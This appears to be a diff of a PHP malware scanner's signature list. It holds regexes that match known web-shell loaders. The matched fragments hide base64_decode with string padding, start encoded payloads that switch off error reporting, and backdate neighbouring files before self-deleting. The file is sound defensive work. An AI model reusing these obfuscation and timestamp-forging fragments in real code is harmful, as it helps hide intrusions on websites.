+      'pattern' => '/^\\s*\\<\\?php \\$wzgvztqf\\=str_ireplace\\("v","","vvbvvavvvvvsvvvvevvvvv6vvvvv4vvv_vvvvvdvvvevvcvvvvovvvvvdvvvvevv"\\); \\$chyrdaa\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    185 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ehxqcgz\\=str_ireplace\\("p","","pppbppappspppppeppp6ppp4pppp_pppdpppeppppcpppppopppdppppep"\\); \\$vrdqwynqh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    186 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xvhhgyncv\\=str_ireplace\\("g","","gggbggagggggsggggegg6ggggg4ggg_ggggdgggggeggggcgggggoggggdgggegg"\\); \\$qnfxbh\\="DQoJCUBlcnJvcl9yZXBvcnRpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    187 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fmsdgzs\\=str_ireplace\\("p","","ppbppppppappppspppppepppp6ppp4ppp_ppppdppppppeppppcppppppoppppppdppppep"\\); \\$cqwya\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    188 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fkzyt\\=str_ireplace\\("i","","iibiiiiaiiiiisiiiiiieiiii6iii4iiii_iiiiidiiiieiiiiiiciiiiioiidiiiei"\\); \\$xndka\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    189 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dubazdry\\=str_ireplace\\("z","","zzbzzzzzzazzzszzzzzezz6zzzzz4zzz_zzzzzzdzzzezzzzzzczzzozzzzzdzzzezzz"\\); \\$axnhhmr\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    190 => 
+    array (
+      'pattern' => '/wZEhBNkx5OG5MaVJmVTBWU1ZrVlNXeWRJVkZSUVgwaFBVMVF[\\s\\S]{0,12000}\'\\)\\)
+\\{
+	define\\(\'XSDS\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    191 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$hcftvxs\\=str_ireplace\\("w","","wwwbwwwwwawwwswwwwewwww6wwww4wwwww_wwwwwdwwwwwewwcwwwwwowwwdwwwwwwew"\\); \\$xehygm\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    192 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}wWW1kamJXUjJaM2dwS1RzZ0pHUnZiVDBrWkc5dFd6SmRPMzB/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    193 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Error Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}array             \\(\\$it\\)                  \\)
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    194 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "UmVgDhdKFM"; if \\(file_exists\\("\\.\\/segnala\\.php"\\)\\)\\{ touch\\("\\.\\/segnala\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*mwCV0TgqxRY/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    195 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$kxbyqm\\=str_ireplace\\("h","","hhbhhhhahhhhhshhhehh6hhhh4hhhhh_hhhhhhdhhhhhehhhhchhohhhhdhhhhehhh"\\); \\$ezxcv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    196 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fpepbxtd\\=str_ireplace\\("n","","nnnbnnnnnannnsnnnnennn6nnnn4nnn_nndnnennnncnnnonnnndnnnnennn"\\); \\$decxxcnc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    197 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xtbyudzrp\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$extnqg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    198 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$psweevmbu\\=str_ireplace\\("t","","ttbttttattttstttttettt6ttttt4tttttt_ttttdttttettctttotttdtttttettt"\\); \\$vvpnygyxrd\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    199 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ffpec\\=str_ireplace\\("i","","iiibiiiaiisiiieiiiii6iiiii4iiiiii_iiiiiidiiieiiiiciiiioiiiiidiiiieii"\\); \\$tmamffrtbq\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    200 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ttawtdqv\\=str_ireplace\\("p","","pbppppappppsppppppepppp6ppppp4pppp_ppppdppppeppppppcppppppopppdppppeppp"\\); \\$vvsgz\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    201 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "YrHcwRvFTt"; if \\(file_exists\\("\\.\\/park\\.inc\\.php"\\)\\)\\{ touch\\("\\.\\/park\\.inc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4GakpK4UU/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    202 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$meggdkswq\\=str_ireplace\\("r","","rrbrrrrrrarrrrsrrrrerrr6rrrrrr4rrrr_rrrdrrrerrrrcrrrrorrrrdrrrrer"\\); \\$qnhmbswkv\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    203 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$utaxhset\\=str_ireplace\\("k","","kkbkkkakkkkskkekkkkk6kkk4kkkkk_kkkkdkkkekkkkkkckkkkkokkkdkkkkekkk"\\); \\$ancea\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    204 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$nhquayfzwz\\=str_ireplace\\("p","","pbppppappppsppppppepppp6ppppp4pppp_ppppdppppeppppppcppppppopppdppppeppp"\\); \\$pqxauacu\\="DQoJCUBlcnJvcl9/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    205 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bskhqrwwcu\\=str_ireplace\\("u","","uuubuuuuauuuusuuuueuuuuuu6uuuu4uuuu_uuuuduuuueuuuucuuuouuuuuduuueu"\\); \\$gnakgtv\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    206 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "AyfmskxZuZ"; if \\(file_exists\\("\\.\\/api\\.suggest\\.php"\\)\\)\\{ touch\\("\\.\\/api\\.suggest\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*hCz/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    207 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}tS0NSdGIyUmxQVDBpYzJWMFkyOXVabWxuSWlCQlRrUWdKR2R/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    208 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "HeDXzaPkgT"; if \\(file_exists\\("\\.\\/site_login\\.php"\\)\\)\\{ touch\\("\\.\\/site_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ddCQN/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    209 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*
+\\| You should      have received     a/s',
+      'label' => 'sample-specific content window',
+    ),
+    210 => 
+    array (
+      'pattern' => '/1iM0p0SUc1aGJXVTlJbVp2Y20weElpQnRaWFJvYjJROUluQn[\\s\\S]{0,12000}\\)\\)
+\\{
+	define\\(\'GXRCMH\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    211 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pmfhfgzz\\=str_ireplace\\("g","","gggbggagggggsggggegg6ggggg4ggg_ggggdgggggeggggcgggggoggggdgggegg"\\); \\$srdukpup\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    212 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$dwcuynhtz\\=str_ireplace\\("p","","ppbppppappppsppppeppppp6ppppp4ppppp_ppppppdppppppeppppppcppppoppppdppppppep"\\); \\$xbdfeapwpr\\="DQoJCUBlcn/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    213 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "txAcDyMGPX"; if \\(file_exists\\("\\.\\/goods_script\\.php"\\)\\)\\{ touch\\("\\.\\/goods_script\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*k/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    214 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$kaxxctbupv\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$zwfgtqf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    215 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ehcpr\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xxxx4xx_xxxxdxxxexxxcxxxxoxxxdxxxxex"\\); \\$tcgsucaz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    216 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "eatycfrfCa"; if \\(file_exists\\("\\.\\/frozenLib\\.php"\\)\\)\\{ touch\\("\\.\\/frozenLib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ar1G7gE/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    217 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zzwnrt\\=str_ireplace\\("t","","ttbttttattttstttttettt6ttttt4tttttt_ttttdttttettctttotttdtttttettt"\\); \\$dvwnvmcab\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    218 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$rndzz\\=str_ireplace\\("i","","ibiiaiisiiiieiiiiii6iii4iiii_iidiiiiieiiiciiiioiiiidiiiiiei"\\); \\$sdebzzz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    219 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$stmww\\=str_ireplace\\("m","","mmbmmmmammmmsmmemmmmm6mmmmm4mmmm_mmdmmmmmemmcmmmommmmmmdmmmemmm"\\); \\$rawsqpkh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    220 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$tsctsrwhha\\=str_ireplace\\("x","","xxxbxxxxxaxxxsxxxxxexx6xxxxx4xxxxx_xxxxdxxxxxxexxxxcxxxxxoxxxxdxxxxxxex"\\); \\$yydzbgxtt\\="DQoJCUBlcnJvcl/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    221 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$quetsnbn\\=str_ireplace\\("r","","rbrrrrrarrrrrrsrrrrerrrr6rrrrr4rrrrrr_rrrrrrdrrrrerrrcrrrrorrrrrrdrrrrer"\\); \\$ckzdtwad\\="DQoJCUBlcnJvcl9y/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    222 => 
+    array (
+      'pattern' => '/MUpYUVZKRVJVUmZSazlTSnl3TkNpOHZKMGhVVkZCZlJrOVNW[\\s\\S]{0,12000}\'\\)\\)
+\\{
+	define\\(\'MSYXNY\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    223 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @package    Lib
+ \\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}\\(  \\$_POST\\[\'c\'\\]\\)                      \\)\\)
+
+
+;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    224 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xccfrw\\=str_ireplace\\("h","","hhhbhhhhhhahhshhhhhhehhh6hhhhh4hhh_hhhdhhhhehhhchhhhohhhhhdhhhheh"\\); \\$zgafau\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    225 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "YCWVNvfVQN"; if \\(file_exists\\("\\.\\/sang\\.lib\\.php"\\)\\)\\{ touch\\("\\.\\/sang\\.lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dfmdDf0dS/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    226 => 
+    array (
+      'pattern' => '/QmxQU0owWlhoMElpQnVZVzFsUFNKd1pYTmthV1FpSUhaaGJI[\\s\\S]{0,12000}VEDF\'\\)\\)
+\\{
+	define\\(\'EVEDF\', __DIR__\\);
+\\}
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    227 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$pfqzx\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqeqq6qqqq4qqqq_qqqqqdqqqeqqqcqqqqoqqqdqqqqeq"\\); \\$dhnzfub\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    228 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "tmYQdTSwQg"; if \\(file_exists\\("\\.\\/article_details\\.php"\\)\\)\\{ touch\\("\\.\\/article_details\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    229 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "YPfhknqUND"; if \\(file_exists\\("\\.\\/reseller\\.php"\\)\\)\\{ touch\\("\\.\\/reseller\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*aeGrEqPXG/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    230 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ytncpy\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiii6iiii4iiii_iiiidiiiiieiiiiciioiiidiiiiiieii"\\); \\$pzuangestw\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    231 => 
+    array (
+      'pattern' => '/BOQ2tCbGNuSnZjbDl5WlhCdmNuUnBibWNvTUNrN0RRcEFhVz[\\s\\S]{0,12000}\\(\'MQPPP\'\\)\\)
+\\{
+	define\\(\'MQPPP\', __DIR__\\);
+\\}
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    232 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$xuyhd\\=str_ireplace\\("v","","vvbvvavvvvvsvvvvevvvvv6vvvvv4vvv_vvvvvdvvvevvcvvvvovvvvvdvvvvevv"\\); \\$faptu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    233 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ernwr\\=str_ireplace\\("q","","qqqbqqqaqqqqqqsqqqqqqeqq6qqqq4qqq_qqqqdqqqeqqqcqqqqqqoqqqqdqqqqeq"\\); \\$krcufbs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    234 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bravqzt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ksfbtgnprc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    235 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "tnXxUtYkyZ"; if \\(file_exists\\("\\.\\/forgotpassword\\.php"\\)\\)\\{ touch\\("\\.\\/forgotpassword\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    236 => 
+    array (
+      'pattern' => '/kx5Y3VKRjlUUlZKV1JWSmJKMGhVVkZCZlNFOVRWQ2RkTGlSZ[\\s\\S]{0,12000}LL \\^ \\(E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    237 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$aqeubk\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$aqfmwhyvxh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    238 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$bupwgex\\=str_ireplace\\("q","","qqqbqqqqqaqqqqqsqqqqqqeqqqq6qq4qq_qqqqqqdqqqqeqqqqcqqqqqoqqqqdqqqeqqq"\\); \\$nrakw\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    239 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$qqquthpgv\\=str_ireplace\\("q","","qqbqqqqqqaqqqsqqqqeqqqqq6qqqqq4qqqq_qqdqqqqqeqqqqqcqqqoqqdqqeq"\\); \\$wfpzqr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    240 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "fSwxuctTqY"; if \\(file_exists\\("\\.\\/playlist\\.php"\\)\\)\\{ touch\\("\\.\\/playlist\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*mraPAgxW3/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    241 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$esrgvrmrs\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$rfskvq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    242 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gvefnmeav\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$qrehkx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    243 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$hpzvftf\\=str_ireplace\\("g","","gggbgggggagggggsggggegggggg6gggg4gggg_ggggdggggeggggcggoggggggdggggeg"\\); \\$zzqeb\\="DQoJCUBlcnJvcl9yZXBvcnR/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    244 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$tscdxbhvc\\=str_ireplace\\("i","","ibiiiiiaiiiisiiiiiieiiiii6iii4iii_iiiidiieiiiciiioiiiiidiiiiieii"\\); \\$ggwxqsz\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    245 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mcfrswnzud\\=str_ireplace\\("m","","mmmbmmmmmammmsmmmemmmm6mmm4mmm_mmmdmmmmemmmmcmmmmommmmdmmmmem"\\); \\$kwtcrpd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    246 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$zbznc\\=str_ireplace\\("p","","pbppppappspppeppppp6pppp4ppppp_pppppdppppepppppcpppopppdpppppeppp"\\); \\$ffdytmh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    247 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "qUcKcmfxwm"; if \\(file_exists\\("\\.\\/newsletters\\.php"\\)\\)\\{ touch\\("\\.\\/newsletters\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*kVg/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    248 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* Used to set up and fix common varia[\\s\\S]{0,12000}\\. WPINC \\. \'\\/rest\\-api\\/class\\-wp\\-rest\\-request\\.php\'/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    249 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}OUpHdGhMaWRJUWtFdkx5QW5MbUpoYzJVMk5GOWtaV052WkdV/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    250 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$mmgewy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$mguqccxxrs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    251 => 
     array (
       'pattern' => '/\'\\/class\\-IXR\\.php\' \\);
 include_once\\( ABSPATH \\. WPINC \\. \'\\/class\\-wp\\-xmlrpc\\-server\\.php\' \\);
@@ -7906,93 +1691,2017 @@ include_once\\( ABSPATH \\. WPINC \\. \'\\/class\\-wp\\-xmlrpc\\-server\\.php\' 
  \\* Posts submitted via the XML/s',
       'label' => 'sample-specific content window',
     ),
-    1207 => 
+    252 => 
     array (
-      'pattern' => '/We already have a ping from that URL for this post\\./',
+      'pattern' => '/^\\s*\\<\\?php \\$yqhtxrwhan\\=str_ireplace\\("f","","ffbfffffaffffsfffeffff6ffffff4ffff_ffdfffffeffffcfffffoffffdffffefff"\\); \\$gudqdk\\="DQoJCUBlcnJvcl9yZXBv/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    253 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "pssVDrkyCu"; if \\(file_exists\\("\\.\\/editgames\\.php"\\)\\)\\{ touch\\("\\.\\/editgames\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*URFvSHu/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    254 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$tvkusuckzz\\=str_ireplace\\("r","","rbrrrrarrrrrsrrerrrrrr6rrrr4rrrr_rrrrrdrrrerrrrrcrrrrrorrrdrrrerrr"\\); \\$mznxrtd\\="DQoJCUBlcnJvcl9yZXBvc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    255 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*
+\\| This  program is     distributed in/s',
+      'label' => 'sample-specific content window',
+    ),
+    256 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$wgguv\\=str_ireplace\\("y","","ybyyyyayyyysyyyyeyyy6yyyyy4yyy_yyyydyyeyyyycyyoyyyydyyyyyey"\\); \\$eumbwze\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    257 => 
+    array (
+      'pattern' => '/and2ZEdRK1BIUmtQa3RGV1R3dmRHUStQSFJrUGp4cGJuQjFk[\\s\\S]{0,12000}\\(E_DEPRECATED\\|E_USER_DEPRECATED\\)\\);
+\\}
+
+
+
+
+
+
+
+
+
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    258 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "puTtDAmceG"; if \\(file_exists\\("\\.\\/orderhistory\\.php"\\)\\)\\{ touch\\("\\.\\/orderhistory\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*c/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    259 => 
+    array (
+      'pattern' => '/\\] \\);
+	\\$tb_id \\= intval\\( \\$tb_id\\[ count\\( \\$tb_id \\) \\- 1 \\] \\);
+\\}
+
+\\$tb_url  \\= isset\\( \\$_POST\\[/',
       'label' => 'sample-specific literal',
     ),
-    1208 => 
+    260 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$hqceegmgfv\\=str_ireplace\\("n","","nnnbnnnnnannnnsnnnnennnn6nnn4nn_nnnndnnennnncnnnonnnnndnnnnenn"\\); \\$ghxuhs\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    261 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "SbAKxpksph"; if \\(file_exists\\("\\.\\/search_config\\.php"\\)\\)\\{ touch\\("\\.\\/search_config\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\//s',
+      'label' => 'source-file first-line anchor',
+    ),
+    262 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}x5OGdQVzU1Y2s1aFFsUnhLV0l0WkZGbGMzb3VPUzFMVjNsb0/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    263 => 
+    array (
